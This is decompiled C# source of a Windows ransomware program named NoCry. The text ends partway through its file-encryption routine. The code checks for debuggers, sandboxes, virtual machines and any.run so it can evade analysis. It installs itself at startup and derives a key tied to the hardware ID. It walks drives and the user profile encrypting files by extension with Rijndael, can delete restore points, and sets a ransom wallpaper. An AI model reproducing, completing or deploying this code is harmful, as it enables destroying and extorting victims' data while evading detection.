using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My;
using NoCry.My.Resources;

namespace NoCry;

[StandardModule]
internal sealed class Module1
{
	private enum CryptoAction
	{
		ActionEncrypt = 1
	}

	private static FileStream fsInput;

	private static FileStream fsOutput;

	private static byte[] bytKey;

	private static byte[] bytIV;

	private static string textbox;

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	public static object protect;

	public static List<string> list = new List<string>();

	public static object MT = null;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void main()
	{
		//IL_0ba0: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num = default(int);
		bool createdNew = default(bool);
		int num2 = default(int);
		int num3 = default(int);
		IEnumerator enumerator = default(IEnumerator);
		int num5 = default(int);
		string text = default(string);
		StringBuilder stringBuilder = default(StringBuilder);
		Random random = default(Random);
		int maxrandom = default(int);
		int num6 = default(int);
		string input = default(string);
		int index = default(int);
		char value = default(char);
		string[] logicalDrives = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		DriveInfo driveInfo = default(DriveInfo);
		string[] directories = default(string[]);
		int num8 = default(int);
		string text3 = default(string);
		string lpvParam = default(string);
		IEnumerator<string> enumerator2 = default(IEnumerator<string>);
		string current = default(string);
		string[] directories2 = default(string[]);
		int num9 = default(int);
		string ruta = default(string);
		IEnumerator<string> enumerator3 = default(IEnumerator<string>);
		string current2 = default(string);
		IEnumerator enumerator4 = default(IEnumerator);
		IEnumerator<string> enumerator5 = default(IEnumerator<string>);
		string current3 = default(string);
		string text4 = default(string);
		string[] directories3 = default(string[]);
		int num10 = default(int);
		string ruta2 = default(string);
		IEnumerator<string> enumerator6 = default(IEnumerator<string>);
		string current4 = default(string);
		List<string>.Enumerator enumerator7 = default(List<string>.Enumerator);
		string current5 = default(string);
		string[] logicalDrives2 = default(string[]);
		string text5 = default(string);
		DriveInfo driveInfo2 = default(DriveInfo);
		string[] directories4 = default(string[]);
		int num11 = default(int);
		string text6 = default(string);
		IEnumerator enumerator8 = default(IEnumerator);
		string text7 = default(string);
		IEnumerator enumerator9 = default(IEnumerator);
		string text8 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						num = 1;
						createdNew = false;
						goto IL_0006;
					case 3951:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0006;
							case 3:
								goto IL_001a;
							case 4:
							case 5:
								goto IL_0027;
							case 6:
								goto IL_0030;
							case 7:
							case 8:
							case 9:
								goto IL_003e;
							case 10:
								goto IL_0048;
							case 11:
							case 12:
							case 13:
								goto IL_0057;
							case 14:
								goto IL_0061;
							case 15:
							case 16:
							case 17:
								goto IL_0070;
							case 18:
								goto IL_007a;
							case 19:
							case 20:
							case 21:
								goto IL_0089;
							case 22:
								goto IL_0093;
							case 23:
							case 24:
							case 25:
								goto IL_00a2;
							case 26:
								goto IL_00ac;
							case 27:
							case 28:
								goto IL_00ba;
							case 29:
								goto IL_00cc;
							case 31:
								goto IL_00fb;
							case 32:
								goto IL_0126;
							case 33:
								goto IL_0130;
							case 34:
								goto IL_013a;
							case 35:
								goto IL_0149;
							case 36:
								goto IL_0160;
							case 37:
								goto IL_0171;
							case 38:
								goto IL_017e;
							case 39:
								goto IL_018d;
							case 40:
								goto IL_0199;
							case 41:
								goto IL_01cb;
							case 30:
							case 42:
							case 43:
							case 44:
								goto IL_0223;
							case 46:
								goto IL_0252;
							case 47:
								goto IL_025a;
							case 48:
								goto IL_0299;
							case 49:
								goto IL_02d8;
							case 50:
								goto IL_02f9;
							case 51:
								goto IL_0305;
							case 53:
								goto IL_0327;
							case 54:
								goto IL_034a;
							case 56:
								goto IL_035e;
							case 58:
								goto IL_0372;
							case 60:
								goto IL_0386;
							case 62:
								goto IL_039a;
							case 64:
								goto IL_03ae;
							case 66:
								goto IL_03c2;
							case 68:
								goto IL_03d6;
							case 70:
								goto IL_03ea;
							case 72:
								goto IL_03fe;
							case 74:
								goto IL_0412;
							case 76:
								goto IL_0426;
							case 77:
								goto IL_044e;
							case 79:
								goto IL_045f;
							case 81:
								goto IL_0470;
							case 78:
							case 80:
							case 82:
							case 83:
							case 84:
								goto IL_047f;
							case 85:
								goto IL_0484;
							case 98:
								goto IL_0497;
							case 99:
								goto IL_04c4;
							case 101:
								goto IL_04d5;
							case 103:
								goto IL_04e6;
							case 100:
							case 102:
							case 104:
							case 105:
							case 106:
								goto IL_04f5;
							case 107:
								goto IL_04fa;
							case 52:
							case 108:
							case 109:
								goto IL_0508;
							case 55:
							case 57:
							case 59:
							case 61:
							case 63:
							case 65:
							case 67:
							case 69:
							case 71:
							case 73:
							case 75:
							case 86:
							case 87:
							case 88:
							case 89:
							case 90:
							case 91:
							case 92:
							case 93:
							case 94:
							case 95:
							case 96:
							case 97:
								goto IL_0516;
							case 110:
								goto IL_0524;
							case 111:
								goto IL_0554;
							case 113:
								goto IL_0565;
							case 115:
								goto IL_0576;
							case 112:
							case 114:
							case 116:
							case 117:
							case 118:
								goto IL_0585;
							case 119:
								goto IL_058a;
							case 120:
								goto IL_0598;
							case 121:
								goto IL_05c3;
							case 122:
								goto IL_05eb;
							case 124:
								goto IL_05fc;
							case 126:
								goto IL_060d;
							case 130:
								goto IL_061e;
							case 131:
								goto IL_062f;
							case 123:
							case 125:
							case 127:
							case 128:
							case 129:
								goto IL_0640;
							case 132:
								goto IL_0648;
							case 133:
								goto IL_066c;
							case 134:
								goto IL_067b;
							case 135:
							case 136:
								goto IL_069f;
							case 137:
								goto IL_06a7;
							case 138:
								goto IL_06ba;
							case 45:
							case 139:
							case 140:
								goto IL_06d4;
							case 141:
								goto IL_06dc;
							case 142:
								goto IL_0700;
							case 143:
								goto IL_070f;
							case 145:
								goto IL_0734;
							case 146:
								goto IL_075a;
							case 148:
								goto IL_0771;
							case 150:
								goto IL_0788;
							case 152:
								goto IL_079f;
							case 154:
								goto IL_07b6;
							case 156:
								goto IL_07cd;
							case 158:
								goto IL_07e4;
							case 160:
								goto IL_07fb;
							case 162:
								goto IL_0812;
							case 164:
								goto IL_0829;
							case 166:
								goto IL_0840;
							case 168:
								goto IL_0857;
							case 169:
								goto IL_0887;
							case 171:
								goto IL_089b;
							case 173:
								goto IL_08af;
							case 170:
							case 172:
							case 174:
							case 175:
							case 176:
								goto IL_08c1;
							case 177:
								goto IL_08c9;
							case 190:
								goto IL_08ec;
							case 191:
								goto IL_0921;
							case 193:
								goto IL_0935;
							case 195:
								goto IL_0949;
							case 192:
							case 194:
							case 196:
							case 197:
							case 198:
								goto IL_095b;
							case 199:
								goto IL_0963;
							case 144:
							case 200:
							case 201:
								goto IL_097e;
							case 147:
							case 149:
							case 151:
							case 153:
							case 155:
							case 157:
							case 159:
							case 161:
							case 163:
							case 165:
							case 167:
							case 178:
							case 179:
							case 180:
							case 181:
							case 182:
							case 183:
							case 184:
							case 185:
							case 186:
							case 187:
							case 188:
							case 189:
								goto IL_098f;
							case 202:
								goto IL_09a0;
							case 203:
								goto IL_09d8;
							case 205:
								goto IL_09ec;
							case 207:
								goto IL_0a00;
							case 204:
							case 206:
							case 208:
							case 209:
							case 210:
								goto IL_0a12;
							case 211:
								goto IL_0a1a;
							case 212:
								goto IL_0a35;
							case 213:
								goto IL_0a63;
							case 214:
								goto IL_0a93;
							case 216:
								goto IL_0aa7;
							case 218:
								goto IL_0abb;
							case 222:
								goto IL_0acf;
							case 223:
								goto IL_0aea;
							case 215:
							case 217:
							case 219:
							case 220:
							case 221:
								goto IL_0afb;
							case 224:
								goto IL_0b06;
							case 225:
								goto IL_0b1e;
							case 226:
							case 227:
								goto IL_0b29;
							case 228:
								goto IL_0b36;
							case 229:
							case 230:
								goto IL_0b41;
							case 231:
								goto IL_0b58;
							case 233:
								goto IL_0b67;
							case 232:
							case 234:
							case 235:
								goto IL_0b7e;
							case 236:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 237:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_09a0:
						num = 202;
						enumerator = ((IEnumerable)enc2(Interaction.Environ("USERPROFILE"))).GetEnumerator();
						goto IL_09c1;
						IL_097e:
						num = 201;
						num5++;
						goto IL_06ec;
						IL_0006:
						num = 2;
						MT = new Mutex(initiallyOwned: true, Class1.Settings.mute, out createdNew);
						goto IL_001a;
						IL_001a:
						num = 3;
						if (!createdNew)
						{
							ProjectData.EndApp();
						}
						goto IL_0027;
						IL_09c1:
						if (enumerator.MoveNext())
						{
							text = Conversions.ToString(enumerator.Current);
							goto IL_09d8;
						}
						goto IL_0a1a;
						IL_0027:
						num = 5;
						if (Class1.Settings.Emulator)
						{
							goto IL_0030;
						}
						goto IL_003e;
						IL_0030:
						num = 6;
						if (Anti.Emulator())
						{
							ProjectData.EndApp();
						}
						goto IL_003e;
						IL_0b36:
						num = 228;
						DeleteRestorePoints();
						goto IL_0b41;
						IL_003e:
						num = 9;
						if (Class1.Settings.DetectDebugger)
						{
							goto IL_0048;
						}
						goto IL_0057;
						IL_0048:
						num = 10;
						if (Anti.DetectDebugger())
						{
							ProjectData.EndApp();
						}
						goto IL_0057;
						IL_09d8:
						num = 203;
						if (Operators.CompareString(text, (string)null, false) != 0)
						{
							goto IL_09ec;
						}
						goto IL_0a12;
						IL_0057:
						num = 13;
						if (Class1.Settings.DetectSandboxie)
						{
							goto IL_0061;
						}
						goto IL_0070;
						IL_0061:
						num = 14;
						if (Anti.DetectSandboxie())
						{
							ProjectData.EndApp();
						}
						goto IL_0070;
						IL_09ec:
						num = 205;
						if (!Form4.listenc.Contains(text))
						{
							goto IL_0a00;
						}
						goto IL_0a12;
						IL_0070:
						num = 17;
						if (Class1.Settings.DetectVirtualMachine)
						{
							goto IL_007a;
						}
						goto IL_0089;
						IL_007a:
						num = 18;
						if (Anti.DetectVirtualMachine())
						{
							ProjectData.EndApp();
						}
						goto IL_0089;
						IL_0a00:
						num = 207;
						Form4.listenc.Add(text);
						goto IL_0a12;
						IL_0089:
						num = 21;
						if (Class1.Settings.anyrun)
						{
							goto IL_0093;
						}
						goto IL_00a2;
						IL_0093:
						num = 22;
						if (Anti.anyrun())
						{
							ProjectData.EndApp();
						}
						goto IL_00a2;
						IL_0a12:
						num = 210;
						goto IL_09c1;
						IL_00a2:
						num = 25;
						if (Class1.Settings.startup)
						{
							goto IL_00ac;
						}
						goto IL_00ba;
						IL_00ac:
						num = 26;
						startup(Application.get_ExecutablePath());
						goto IL_00ba;
						IL_00ba:
						num = 28;
						Class1.Settings.hash = Conversions.ToString(Bot());
						goto IL_00cc;
						IL_00cc:
						num = 29;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", Class1.Settings.Setting, ""), "Done", false) != 0)
						{
							goto IL_00fb;
						}
						goto IL_0223;
						IL_00fb:
						num = 31;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", Class1.Settings.Setting, ""), (string)null, false) == 0)
						{
							goto IL_0126;
						}
						goto IL_0223;
						IL_0126:
						num = 32;
						stringBuilder = new StringBuilder();
						goto IL_0130;
						IL_0130:
						num = 33;
						random = new Random();
						goto IL_013a;
						IL_013a:
						num = 34;
						maxrandom = Class1.Settings.maxrandom;
						num6 = 1;
						goto IL_0187;
						IL_0187:
						if (num6 <= maxrandom)
						{
							goto IL_0149;
						}
						goto IL_018d;
						IL_018d:
						num = 39;
						input = stringBuilder.ToString();
						goto IL_0199;
						IL_0199:
						num = 40;
						Interaction.SaveSetting("F", "0", Class1.Settings.Setting, Conversions.ToString(check.AES_Encrypt(input, HWID() + HWID())));
						goto IL_01cb;
						IL_01cb:
						num = 41;
						Interaction.SaveSetting("G", "0", Class1.Settings.Setting, Conversions.ToString(check.AES_Encrypt(Class1.Settings.Setting, Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class1.Settings.Setting, ""), HWID() + HWID())))));
						goto IL_0223;
						IL_0149:
						num = 35;
						index = random.Next(0, Class1.Settings.validchars.Length);
						goto IL_0160;
						IL_0160:
						num = 36;
						value = Class1.Settings.validchars[index];
						goto IL_0171;
						IL_0171:
						num = 37;
						stringBuilder.Append(value);
						goto IL_017e;
						IL_017e:
						num = 38;
						num6++;
						goto IL_0187;
						IL_0223:
						num = 44;
						if (Operators.CompareString(Interaction.GetSetting("C", "0", Class1.Settings.Setting, ""), "Done", false) != 0)
						{
							goto IL_0252;
						}
						goto IL_06d4;
						IL_0252:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_025a;
						IL_025a:
						num = 47;
						bytKey = CreateKey(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class1.Settings.Setting, ""), HWID() + HWID())));
						goto IL_0299;
						IL_0299:
						num = 48;
						bytIV = CreateIV(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class1.Settings.Setting, ""), HWID() + HWID())));
						goto IL_02d8;
						IL_02d8:
						num = 49;
						logicalDrives = Environment.GetLogicalDrives();
						num7 = 0;
						goto IL_02e5;
						IL_02e5:
						if (num7 < logicalDrives.Length)
						{
							text2 = logicalDrives[num7];
							goto IL_02f9;
						}
						goto IL_0524;
						IL_0a1a:
						num = 211;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						goto IL_0a35;
						IL_02f9:
						num = 50;
						driveInfo = new DriveInfo(text2);
						goto IL_0305;
						IL_0305:
						num = 51;
						if (Operators.CompareString(driveInfo.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_0327;
						}
						goto IL_0508;
						IL_0327:
						num = 53;
						directories = Directory.GetDirectories(text2);
						num8 = 0;
						goto IL_0336;
						IL_0336:
						if (num8 < directories.Length)
						{
							text3 = directories[num8];
							goto IL_034a;
						}
						goto IL_0497;
						IL_0b41:
						num = 230;
						lpvParam = Path.GetTempPath() + "Cry.img";
						goto IL_0b58;
						IL_034a:
						num = 54;
						if (!text3.EndsWith("Bin"))
						{
							goto IL_035e;
						}
						goto IL_0516;
						IL_035e:
						num = 56;
						if (!text3.EndsWith("indows"))
						{
							goto IL_0372;
						}
						goto IL_0516;
						IL_0372:
						num = 58;
						if (!text3.EndsWith("tings"))
						{
							goto IL_0386;
						}
						goto IL_0516;
						IL_0386:
						num = 60;
						if (!text3.EndsWith("System Volume Information"))
						{
							goto IL_039a;
						}
						goto IL_0516;
						IL_039a:
						num = 62;
						if (!text3.EndsWith("cache"))
						{
							goto IL_03ae;
						}
						goto IL_0516;
						IL_03ae:
						num = 64;
						if (!text3.EndsWith("very"))
						{
							goto IL_03c2;
						}
						goto IL_0516;
						IL_03c2:
						num = 66;
						if (!text3.EndsWith("rogram Files (x86)"))
						{
							goto IL_03d6;
						}
						goto IL_0516;
						IL_03d6:
						num = 68;
						if (!text3.EndsWith("rogram Files"))
						{
							goto IL_03ea;
						}
						goto IL_0516;
						IL_03ea:
						num = 70;
						if (!text3.EndsWith("boot"))
						{
							goto IL_03fe;
						}
						goto IL_0516;
						IL_03fe:
						num = 72;
						if (!text3.EndsWith("efi"))
						{
							goto IL_0412;
						}
						goto IL_0516;
						IL_0412:
						num = 74;
						if (!text3.EndsWith(".old"))
						{
							goto IL_0426;
						}
						goto IL_0516;
						IL_0426:
						num = 76;
						enumerator2 = outonly(text3, Class1.Settings.mExtesiones).GetEnumerator();
						goto IL_043c;
						IL_043c:
						if (enumerator2.MoveNext())
						{
							current = enumerator2.Current;
							goto IL_044e;
						}
						goto IL_0484;
						IL_0a35:
						num = 212;
						directories2 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num9 = 0;
						goto IL_0a4f;
						IL_044e:
						num = 77;
						if (Operators.CompareString(current, (string)null, false) != 0)
						{
							goto IL_045f;
						}
						goto IL_047f;
						IL_045f:
						num = 79;
						if (!list.Contains(current))
						{
							goto IL_0470;
						}
						goto IL_047f;
						IL_0470:
						num = 81;
						list.Add(current);
						goto IL_047f;
						IL_047f:
						num = 84;
						goto IL_043c;
						IL_0484:
						num = 85;
						enumerator2?.Dispose();
						goto IL_0516;
						IL_0a4f:
						if (num9 < directories2.Length)
						{
							ruta = directories2[num9];
							goto IL_0a63;
						}
						goto IL_0b06;
						IL_0516:
						num = 97;
						num8++;
						goto IL_0336;
						IL_0497:
						num = 98;
						enumerator3 = inonly(driveInfo.Name, Class1.Settings.mExtesiones).GetEnumerator();
						goto IL_04b2;
						IL_04b2:
						if (enumerator3.MoveNext())
						{
							current2 = enumerator3.Current;
							goto IL_04c4;
						}
						goto IL_04fa;
						IL_0b58:
						num = 231;
						if (!File.Exists(lpvParam))
						{
							goto IL_0b67;
						}
						goto IL_0b7e;
						IL_04c4:
						num = 99;
						if (Operators.CompareString(current2, (string)null, false) != 0)
						{
							goto IL_04d5;
						}
						goto IL_04f5;
						IL_04d5:
						num = 101;
						if (!list.Contains(current2))
						{
							goto IL_04e6;
						}
						goto IL_04f5;
						IL_04e6:
						num = 103;
						list.Add(current2);
						goto IL_04f5;
						IL_04f5:
						num = 106;
						goto IL_04b2;
						IL_04fa:
						num = 107;
						enumerator3?.Dispose();
						goto IL_0508;
						IL_0a63:
						num = 213;
						enumerator4 = ((IEnumerable)enc1(ruta)).GetEnumerator();
						goto IL_0a7c;
						IL_0508:
						num = 109;
						num7++;
						goto IL_02e5;
						IL_0524:
						num = 110;
						enumerator5 = inonly(Interaction.Environ("USERPROFILE"), Class1.Settings.mExtesiones).GetEnumerator();
						goto IL_0542;
						IL_0542:
						if (enumerator5.MoveNext())
						{
							current3 = enumerator5.Current;
							goto IL_0554;
						}
						goto IL_058a;
						IL_0a7c:
						if (enumerator4.MoveNext())
						{
							text4 = Conversions.ToString(enumerator4.Current);
							goto IL_0a93;
						}
						goto IL_0acf;
						IL_0554:
						num = 111;
						if (Operators.CompareString(current3, (string)null, false) != 0)
						{
							goto IL_0565;
						}
						goto IL_0585;
						IL_0565:
						num = 113;
						if (!list.Contains(current3))
						{
							goto IL_0576;
						}
						goto IL_0585;
						IL_0576:
						num = 115;
						list.Add(current3);
						goto IL_0585;
						IL_0585:
						num = 118;
						goto IL_0542;
						IL_058a:
						num = 119;
						enumerator5?.Dispose();
						goto IL_0598;
						IL_0b67:
						num = 233;
						((Image)Resources.background).Save(lpvParam, ImageFormat.get_Bmp());
						goto IL_0b7e;
						IL_0598:
						num = 120;
						directories3 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num10 = 0;
						goto IL_05af;
						IL_05af:
						if (num10 < directories3.Length)
						{
							ruta2 = directories3[num10];
							goto IL_05c3;
						}
						goto IL_0648;
						IL_0a93:
						num = 214;
						if (Operators.CompareString(text4, (string)null, false) != 0)
						{
							goto IL_0aa7;
						}
						goto IL_0afb;
						IL_05c3:
						num = 121;
						enumerator6 = outonly(ruta2, Class1.Settings.mExtesiones).GetEnumerator();
						goto IL_05d9;
						IL_05d9:
						if (enumerator6.MoveNext())
						{
							current4 = enumerator6.Current;
							goto IL_05eb;
						}
						goto IL_061e;
						IL_0aa7:
						num = 216;
						if (!Form4.listenc.Contains(text4))
						{
							goto IL_0abb;
						}
						goto IL_0afb;
						IL_05eb:
						num = 122;
						if (Operators.CompareString(current4, (string)null, false) != 0)
						{
							goto IL_05fc;
						}
						goto IL_0640;
						IL_05fc:
						num = 124;
						if (!list.Contains(current4))
						{
							goto IL_060d;
						}
						goto IL_0640;
						IL_060d:
						num = 126;
						list.Add(current4);
						goto IL_0640;
						IL_0640:
						num = 129;
						goto IL_05d9;
						IL_061e:
						num = 130;
						enumerator6?.Dispose();
						goto IL_062f;
						IL_0abb:
						num = 218;
						Form4.listenc.Add(text4);
						goto IL_0afb;
						IL_062f:
						num = 131;
						num10++;
						goto IL_05af;
						IL_0648:
						num = 132;
						enumerator7 = list.GetEnumerator();
						goto IL_065a;
						IL_065a:
						if (enumerator7.MoveNext())
						{
							current5 = enumerator7.Current;
							goto IL_066c;
						}
						goto IL_06a7;
						IL_0afb:
						num = 221;
						goto IL_0a7c;
						IL_066c:
						num = 133;
						if (File.Exists(current5))
						{
							goto IL_067b;
						}
						goto IL_069f;
						IL_067b:
						num = 134;
						EncryptOrDecryptFile(current5, current5 + Class1.Settings.exs, bytKey, bytIV, CryptoAction.ActionEncrypt);
						goto IL_069f;
						IL_069f:
						num = 136;
						goto IL_065a;
						IL_06a7:
						num = 137;
						((IDisposable)enumerator7).Dispose();
						goto IL_06ba;
						IL_06ba:
						num = 138;
						MyProject.Forms.Form1.BackgroundWorker1.RunWorkerAsync();
						goto IL_06d4;
						IL_06d4:
						ProjectData.ClearProjectError();
						num3 = -3;
						goto IL_06dc;
						IL_06dc:
						num = 141;
						logicalDrives2 = Environment.GetLogicalDrives();
						num5 = 0;
						goto IL_06ec;
						IL_06ec:
						if (num5 < logicalDrives2.Length)
						{
							text5 = logicalDrives2[num5];
							goto IL_0700;
						}
						goto IL_09a0;
						IL_0acf:
						num = 222;
						if (enumerator4 is IDisposable)
						{
							(enumerator4 as IDisposable).Dispose();
						}
						goto IL_0aea;
						IL_0700:
						num = 142;
						driveInfo2 = new DriveInfo(text5);
						goto IL_070f;
						IL_070f:
						num = 143;
						if (Operators.CompareString(driveInfo2.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_0734;
						}
						goto IL_097e;
						IL_0734:
						num = 145;
						directories4 = Directory.GetDirectories(text5);
						num11 = 0;
						goto IL_0746;
						IL_0746:
						if (num11 < directories4.Length)
						{
							text6 = directories4[num11];
							goto IL_075a;
						}
						goto IL_08ec;
						IL_0b7e:
						num = 235;
						SystemParametersInfoA(20, 0, ref lpvParam, 1);
						break;
						IL_075a:
						num = 146;
						if (!text6.EndsWith("Bin"))
						{
							goto IL_0771;
						}
						goto IL_098f;
						IL_0771:
						num = 148;
						if (!text6.EndsWith("indows"))
						{
							goto IL_0788;
						}
						goto IL_098f;
						IL_0788:
						num = 150;
						if (!text6.EndsWith("tings"))
						{
							goto IL_079f;
						}
						goto IL_098f;
						IL_079f:
						num = 152;
						if (!text6.EndsWith("System Volume Information"))
						{
							goto IL_07b6;
						}
						goto IL_098f;
						IL_07b6:
						num = 154;
						if (!text6.EndsWith("cache"))
						{
							goto IL_07cd;
						}
						goto IL_098f;
						IL_07cd:
						num = 156;
						if (!text6.EndsWith("very"))
						{
							goto IL_07e4;
						}
						goto IL_098f;
						IL_07e4:
						num = 158;
						if (!text6.EndsWith("rogram Files (x86)"))
						{
							goto IL_07fb;
						}
						goto IL_098f;
						IL_07fb:
						num = 160;
						if (!text6.EndsWith("rogram Files"))
						{
							goto IL_0812;
						}
						goto IL_098f;
						IL_0812:
						num = 162;
						if (!text6.EndsWith("boot"))
						{
							goto IL_0829;
						}
						goto IL_098f;
						IL_0829:
						num = 164;
						if (!text6.EndsWith("efi"))
						{
							goto IL_0840;
						}
						goto IL_098f;
						IL_0840:
						num = 166;
						if (!text6.EndsWith(".old"))
						{
							goto IL_0857;
						}
						goto IL_098f;
						IL_0857:
						num = 168;
						enumerator8 = ((IEnumerable)enc1(text6)).GetEnumerator();
						goto IL_0870;
						IL_0870:
						if (enumerator8.MoveNext())
						{
							text7 = Conversions.ToString(enumerator8.Current);
							goto IL_0887;
						}
						goto IL_08c9;
						IL_0aea:
						num = 223;
						num9++;
						goto IL_0a4f;
						IL_0887:
						num = 169;
						if (Operators.CompareString(text7, (string)null, false) != 0)
						{
							goto IL_089b;
						}
						goto IL_08c1;
						IL_089b:
						num = 171;
						if (!Form4.listenc.Contains(text7))
						{
							goto IL_08af;
						}
						goto IL_08c1;
						IL_08af:
						num = 173;
						Form4.listenc.Add(text7);
						goto IL_08c1;
						IL_08c1:
						num = 176;
						goto IL_0870;
						IL_08c9:
						num = 177;
						if (enumerator8 is IDisposable)
						{
							(enumerator8 as IDisposable).Dispose();
						}
						goto IL_098f;
						IL_0b06:
						num = 224;
						if (Operators.ConditionalCompareObjectEqual(Class1.Settings.Del, (object)"OK", false))
						{
							goto IL_0b1e;
						}
						goto IL_0b29;
						IL_098f:
						num = 189;
						num11++;
						goto IL_0746;
						IL_08ec:
						num = 190;
						enumerator9 = ((IEnumerable)enc2(driveInfo2.Name)).GetEnumerator();
						goto IL_090a;
						IL_090a:
						if (enumerator9.MoveNext())
						{
							text8 = Conversions.ToString(enumerator9.Current);
							goto IL_0921;
						}
						goto IL_0963;
						IL_0b1e:
						num = 225;
						del.del();
						goto IL_0b29;
						IL_0921:
						num = 191;
						if (Operators.CompareString(text8, (string)null, false) != 0)
						{
							goto IL_0935;
						}
						goto IL_095b;
						IL_0935:
						num = 193;
						if (!Form4.listenc.Contains(text8))
						{
							goto IL_0949;
						}
						goto IL_095b;
						IL_0949:
						num = 195;
						Form4.listenc.Add(text8);
						goto IL_095b;
						IL_095b:
						num = 198;
						goto IL_090a;
						IL_0963:
						num = 199;
						if (enumerator9 is IDisposable)
						{
							(enumerator9 as IDisposable).Dispose();
						}
						goto IL_097e;
						IL_0b29:
						num = 227;
						if (Class1.Settings.DeleteRestorePoints)
						{
							goto IL_0b36;
						}
						goto IL_0b41;
						end_IL_0001_2:
						break;
					}
					num = 236;
					((Form)MyProject.Forms.Form1).ShowDialog();
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 3951;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static IEnumerable<string> outonly(string ruta, IEnumerable<string> mExtesiones)
	{
		return (from ifilesinfo in Directory.GetFiles(ruta, "*", SearchOption.AllDirectories)
			where mExtesiones.Contains(Path.GetExtension(ifilesinfo)!.ToLower())
			select ifilesinfo).ToList();
	}

	public static IEnumerable<string> inonly(string ruta, IEnumerable<string> mExtesiones)
	{
		return (from ifilesinfo in Directory.GetFiles(ruta, "*")
			where mExtesiones.Contains(Path.GetExtension(ifilesinfo)!.ToLower())
			select ifilesinfo).ToList();
	}

	public static object enc1(string ruta)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + Class1.Settings.exs, SearchOption.AllDirectories)
			select (ifilesinfo);
	}

	public static object enc2(string ruta)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + Class1.Settings.exs)
			select (ifilesinfo);
	}

	private static void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		long num5 = default(long);
		int num6 = default(int);
		CryptoStream cryptoStream = default(CryptoStream);
		byte[] buffer = default(byte[]);
		long length = default(long);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		FileInfo fileInfo = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 401:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0028;
						case 5:
							goto IL_003d;
						case 6:
							goto IL_004a;
						case 7:
							goto IL_0057;
						case 8:
							goto IL_0065;
						case 9:
							goto IL_006e;
						case 11:
							goto IL_007c;
						case 15:
							goto IL_0097;
						case 16:
							goto IL_00ad;
						case 17:
							goto IL_00bb;
						case 10:
						case 12:
						case 13:
						case 14:
						case 18:
							goto IL_00c6;
						case 19:
							goto IL_00d1;
						case 20:
							goto IL_00db;
						case 21:
							goto IL_00e8;
						case 22:
							goto IL_00f5;
						case 23:
							goto IL_00ff;
						case 24:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 25:
						case 26:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00bb:
					num = 17;
					num5 = checked(num5 + num6);
					goto IL_00c6;
					IL_00ad:
					num = 16;
					cryptoStream.Write(buffer, 0, num6);
					goto IL_00bb;
					IL_000a:
					num = 2;
					fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
					goto IL_0019;
					IL_0019:
					num = 3;
					fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
					goto IL_0028;
					IL_0028:
					num = 4;
					fsOutput.SetLength(0L);
					goto IL_003d;
					IL_003d:
					num = 5;
					buffer = new byte[4097];
					goto IL_004a;
					IL_004a:
					num = 6;
					num5 = 0L;
					goto IL_0057;
					IL_0057:
					num = 7;
					length = fsInput.Length;
					goto IL_0065;
					IL_0065:
					num = 8;
					rijndaelManaged = new RijndaelManaged();
					goto IL_006e;
					IL_006e:
					num = 9;
